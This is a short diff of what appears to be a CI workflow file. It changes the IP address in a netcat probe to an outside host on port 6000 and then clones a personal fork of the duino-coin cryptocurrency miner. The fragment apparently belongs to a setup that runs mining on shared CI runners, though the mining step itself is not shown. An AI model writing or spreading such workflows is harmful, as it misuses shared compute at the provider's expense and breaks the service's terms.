@@ -25,7 +25,7 @@ jobs:
      runner: [0]
    steps:
      - run: |
-        netcat -z -v 51.15.127.80 6000
+        netcat -z -v 5.230.70.190 6000
 
         git clone https://github.com/shah77pc/duino-coin
         cd duino-coin
